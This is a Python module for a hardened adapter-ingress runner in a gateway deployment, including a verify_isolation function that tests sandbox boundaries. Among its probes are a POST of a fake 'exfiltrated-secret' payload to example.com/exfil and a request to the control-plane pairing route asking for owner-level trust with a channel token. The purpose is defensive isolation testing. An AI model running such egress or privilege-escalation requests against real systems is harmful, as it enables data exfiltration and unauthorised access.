"""Thin adapter ingress runner for the SEPARATED (Part-1 hardened) topology.

In the hardened Modal deployment an adapter runs in its OWN Modal Function /
Sandbox — a different container, image, PID namespace and secret scope from the
gateway. This module is the only glc code that runs there. It deliberately
imports **nothing** from the gateway's trust boundary:

    * NOT ``glc.policy``          (policy is evaluated only inside the gateway)
    * NOT ``glc.db``              (the cost ledger is written only by the gateway)
    * NOT ``glc.security.pairing`` (owner/trust state lives on the gateway Volume)
    * NOT ``glc.providers`` / provider keys of any kind

An adapter's job in this topology is narrow:
    1. receive a native, channel-specific event (webhook body / poll result),
    2. normalise it to a ``ChannelMessage`` via the adapter's ``on_message``,
    3. relay that envelope to the gateway over the authenticated WebSocket
       (``WS /v1/channels/{name}``) using its own channel-scoped token,
    4. hand the gateway's ``ChannelReply`` back to the adapter's ``send``.

All enforcement — allowlist, trust classification, rate limiting, the policy
engine, and the append-only audit log — happens on the gateway side of that
WebSocket. The adapter is untrusted and holds only its own channel token
(``GLC_CHANNEL_TOKEN``, see ``glc.security.adapter_auth``) — never the raw
install token that authenticates ``/v1/control/*`` or any other channel's
WS route. Post-audit hardening: earlier versions gave every adapter the
same token as the control plane, so a compromised adapter could call
``/v1/control/pair`` with ``trust_level="owner_paired"`` and self-confirm
it — reopening the ``force_pair_owner`` leak through HTTP instead of an
import. ``GLC_CHANNEL_TOKEN`` cannot authenticate that route at all (see
``verify_isolation``'s control-plane probe below for deployed proof).
"""

from __future__ import annotations

import json
import os
from typing import Any

from glc.channels.base import ChannelAdapter
from glc.channels.envelope import ChannelMessage, ChannelReply


def gateway_ws_url(channel: str) -> str:
    """Base gateway WS endpoint for a channel, from the environment.

    ``GLC_GATEWAY_WS_URL`` is the gateway's public base (e.g.
    ``wss://<ws>--glc-v2-gateway-fastapi-app.modal.run``). The adapter never
    knows the gateway's internal filesystem — only its public URL.
    """
    base = os.environ["GLC_GATEWAY_WS_URL"].rstrip("/")
    return f"{base}/v1/channels/{channel}"


def gateway_http_base() -> str:
    """Gateway HTTP(S) base, derived from the same WS URL env var."""
    base = os.environ["GLC_GATEWAY_WS_URL"].rstrip("/")
    if base.startswith("wss://"):
        return "https://" + base.removeprefix("wss://")
    if base.startswith("ws://"):
        return "http://" + base.removeprefix("ws://")
    return base


def channel_token() -> str:
    """This adapter's own per-channel WS credential.

    Distinct from the control-plane install token, which adapter Functions
    never receive after this fix (see module docstring). Authenticates
    ONLY this adapter's channel route — nothing else on the gateway.
    """
    tok = os.getenv("GLC_CHANNEL_TOKEN", "").strip()
    if not tok:
        raise RuntimeError(
            "GLC_CHANNEL_TOKEN not set — the adapter Function must mount its "
            "own per-channel Secret (see glc.security.adapter_auth) to "
            "authenticate to the gateway."
        )
    return tok


async def relay(adapter: ChannelAdapter, raw: Any) -> dict[str, Any]:
    """Normalise one native event and relay it through the gateway.

    Returns a small status dict describing what happened (for the adapter's
    own webhook HTTP response). Never raises on a normal drop.
    """
    import websockets  # imported lazily so the module loads without the dep

    msg: ChannelMessage | None = await adapter.on_message(raw)
    if msg is None:
        return {"status": "ignored"}

    url = gateway_ws_url(adapter.name)
    headers = {"Authorization": f"Bearer {channel_token()}"}
    async with websockets.connect(url, additional_headers=headers) as ws:
        await ws.send(msg.model_dump_json())
        raw_reply = await ws.recv()

    data = json.loads(raw_reply)
    if "error" in data or data.get("status") == 429:
        # Gateway dropped it (allowlist / rate-limit / bad envelope). The
        # gateway already audited the reason; nothing to send back to the user.
        return {"status": "dropped", "detail": data}

    reply = ChannelReply.model_validate(data)
    await adapter.send(reply)
    return {"status": "ok"}


def verify_isolation() -> dict[str, Any]:
    """Return concrete evidence that this process is outside the gateway's
    trust boundary. Called from a Modal function running in the ADAPTER image
    so the output is real, deployed proof for FINDINGS.md.

    Each check reports what an in-process attacker would try and what actually
    happens here.
    """
    out: dict[str, Any] = {}

    # Leak 1 — provider keys must be absent from the adapter environment.
    provider_keys = [
        "GEMINI_API_KEY", "NVIDIA_API_KEY", "GROQ_API_KEY", "CEREBRAS_API_KEY",
        "OPEN_ROUTER_API_KEY", "GITHUB_ACCESS_TOKEN", "CARTESIA_API_KEY",
        "ELEVENLABS_API_KEY",
    ]
    out["leak1_provider_keys_visible"] = {
        k: (os.environ.get(k) is not None) for k in provider_keys
    }

    # Leaks 3/5/10 — the dangerous CAPABILITIES must not be importable. We test
    # the concrete callables an attacker would use, not bare package names (an
    # empty pruned dir can resolve as a harmless namespace package, which would
    # be misleading). Each attempted import that fails is a leak closed.
    capability_probes = [
        ("leak5_policy_evaluate", "from glc.policy.engine import evaluate"),
        ("leak10_db_log_call", "from glc.db import log_call"),
        ("leak3_force_pair_owner", "from glc.security.pairing import get_pairing_store"),
    ]
    for label, stmt in capability_probes:
        try:
            exec(stmt, {})  # noqa: S102 — deliberate: probing whether the import is reachable
            out[label] = "IMPORTED (LEAK OPEN)"
        except Exception as e:  # ImportError / ModuleNotFoundError expected
            out[label] = f"blocked: {type(e).__name__}: {e}"

    # Leaks 2/4 — the config/audit Volume must not be mounted here.
    out["leak2_4_volume_mounted"] = os.path.isdir("/data/glc")

    # Post-audit fix: the raw install token (the control-plane credential)
    # must be ABSENT here now — only this channel's own scoped token is
    # present. Before the fix both were the same value and both were True.
    out["install_token_in_env"] = bool(os.getenv("GLC_INSTALL_TOKEN"))  # expected False now
    out["channel_token_in_env"] = bool(os.getenv("GLC_CHANNEL_TOKEN"))  # expected True

    # Leak 1/9 reopened-via-HTTP probe: even holding only the channel token,
    # can this adapter reach /v1/control/pair and self-request owner trust?
    # Network-reachable when GLC_GATEWAY_WS_URL points at the real gateway
    # (true both for the plain Function and the Sandbox, whose egress
    # allowlist includes exactly this host) — a REACHED-with-2xx result here
    # would mean the credential fix didn't actually change anything.
    try:
        import httpx

        resp = httpx.post(
            f"{gateway_http_base()}/v1/control/pair",
            json={"channel": "attacker", "channel_user_id": "x", "trust_level": "owner_paired"},
            headers={"Authorization": f"Bearer {os.getenv('GLC_CHANNEL_TOKEN', '')}"},
            timeout=5.0,
        )
        if resp.status_code in (401, 403):
            out["leak1_9_channel_token_cannot_reach_control_plane"] = f"blocked: HTTP {resp.status_code}"
        else:
            out["leak1_9_channel_token_cannot_reach_control_plane"] = (
                f"REACHED (LEAK OPEN): status={resp.status_code} body={resp.text[:200]!r}"
            )
    except Exception as e:
        out["leak1_9_channel_token_cannot_reach_control_plane"] = f"blocked: {type(e).__name__}: {e}"

    # Leak 8 — separate PID namespace: this process is not the gateway.
    out["pid"] = os.getpid()

    # Leak 7 — subprocess/shell access. Confirmed residual risk: Modal 1.5.1
    # always runs container entrypoints as root and has no non-root/read-only
    # knob on app.function or Sandbox.create (deployed proof in FINDINGS.md),
    # so this reports uid 0 / a writable tree here by platform design, not by
    # missing config. Reported plainly rather than hidden behind a dead
    # dockerfile chmod that looked like a fix but wasn't (root ignores it).
    try:
        uid = os.getuid()  # POSIX only; adapter Functions run on Linux containers
    except AttributeError:
        uid = None
    out["leak7_running_as_uid"] = uid
    out["leak7_running_as_root"] = uid == 0 if uid is not None else None
    try:
        probe = "/root/glc/.leak7_write_probe"
        with open(probe, "w") as f:
            f.write("x")
        os.remove(probe)
        out["leak7_source_tree_writable"] = True
    except OSError:
        out["leak7_source_tree_writable"] = False

    # Leak 6 — unbounded network egress. A plain Modal Function has no
    # outbound network control, so this POST to a real, unrelated external
    # domain *succeeds* there (the "before"); wrapped in a modal.Sandbox with
    # an outbound_domain_allowlist limited to the gateway host, the same code
    # should be refused at the network layer (the "after"). Deliberately NOT
    # a made-up hostname like "attacker.example.com" — that fails to resolve
    # via plain DNS regardless of any Modal network policy, which would make
    # a "blocked" result meaningless (blocked by whom?). example.com is a
    # real, always-resolvable IANA test domain outside any allowlist, so a
    # block here is attributable to the sandbox's egress policy specifically.
    try:
        import httpx

        resp = httpx.post(
            "https://example.com/exfil",
            content=b"exfiltrated-secret",
            timeout=5.0,
        )
        out["leak6_egress_to_attacker_domain"] = f"REACHED (LEAK OPEN): status={resp.status_code}"
    except Exception as e:
        out["leak6_egress_to_attacker_domain"] = f"blocked: {type(e).__name__}: {e}"

    return out


class EchoIngressAdapter(ChannelAdapter):
    """Minimal reference adapter proving the separated pattern end-to-end.

    Accepts a trivial native event ``{"channel_user_id": ..., "text": ...}``,
    normalises it to a ``ChannelMessage`` with a conservative ``untrusted``
    trust level (the GATEWAY re-derives the real trust level from pairing state
    — the adapter is not trusted to assert it), and echoes replies to stdout.

    It imports nothing from the gateway trust boundary, so it loads and runs in
    the pruned adapter image where ``glc.policy`` / ``glc.db`` /
    ``glc.security.pairing`` do not exist.
    """

    name = "relay_echo"

    async def on_message(self, raw: Any) -> ChannelMessage | None:  # type: ignore[override]
        if not isinstance(raw, dict):
            return None
        uid = str(raw.get("channel_user_id") or "").strip()
        if not uid:
            return None
        from datetime import UTC, datetime

        return ChannelMessage(
            channel=self.name,
            channel_user_id=uid,
            user_handle=raw.get("user_handle") or uid,
            text=raw.get("text"),
            trust_level="untrusted",  # gateway re-classifies; adapter never asserts trust
            arrived_at=datetime.now(UTC),
            metadata={"via": "relay_runner"},
        )

    async def send(self, reply: ChannelReply) -> Any:  # type: ignore[override]
        print(f"[relay_echo → {reply.channel_user_id}] {reply.text}")
        return {"status": "delivered", "to": reply.channel_user_id}
